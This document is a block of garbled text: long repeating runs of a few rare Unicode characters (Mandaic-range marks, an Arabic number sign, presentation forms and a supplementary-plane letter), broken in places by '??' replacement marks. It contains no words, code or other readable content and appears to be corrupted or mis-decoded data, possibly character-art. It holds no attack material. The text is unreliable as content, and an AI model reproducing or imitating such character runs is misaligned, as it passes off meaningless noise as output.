࡙࡙࡙𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙𞋬??︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬